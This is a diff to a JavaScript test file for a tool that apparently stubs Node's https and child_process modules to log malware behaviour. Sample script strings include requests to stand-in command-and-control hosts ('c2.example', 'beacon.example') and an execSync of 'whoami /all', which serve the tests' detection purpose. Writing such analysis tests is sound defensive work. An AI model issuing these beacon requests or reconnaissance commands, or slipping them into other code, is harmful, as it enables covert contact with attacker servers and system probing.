@@ -23,6 +23,10 @@ describe("require_override stubs", function() {
 			"try { require(\"https\").request(new (require(\"url\").URL)(\"https://c2.example/payload?a=1\")); } catch (e) {}",
 			"try { require(\"https\").request({hostname: \"tls3.example\", port: \"\", pathname: \"/c\", search: \"?q\"}); } catch (e) {}",
 			"try { require(\"node:child_process\").execSync(\"whoami /all\"); } catch (e) {}",
+			// No try/catch: a beacon must not end the analysis.
+			"var req = require(\"https\").request({hostname: \"beacon.example\", path: \"/c\", method: \"POST\"}, function () {});",
+			"req.on(\"error\", function () {}); req.write(\"x\"); req.end();",
+			"require(\"child_process\").execSync(\"after beacon\");",
 			"",
 		].join("\n"));
 		try {
@@ -39,7 +43,10 @@ describe("require_override stubs", function() {
 	});
 	it("logs https requests through the http stub, as https", function() {
 		assert.deepStrictEqual(urls, ["https://tls.example/a", "https://tls2.example:8443/b",
-			"https://c2.example/payload?a=1", "https://tls3.example/c?q"]);
+			"https://c2.example/payload?a=1", "https://tls3.example/c?q", "https://beacon.example/c"]);
+	});
+	it("keeps analysing after an https request", function() {
+		assert(iocs.some((i) => i.value && i.value.command === "after beacon"), JSON.stringify(iocs.map((i) => i.type)));
 	});
 	it("gives node:-prefixed ids the same stub", function() {
 		assert(iocs.some((i) => i.value && i.value.command === "whoami /all"), JSON.stringify(iocs.map((i) => i.type)));
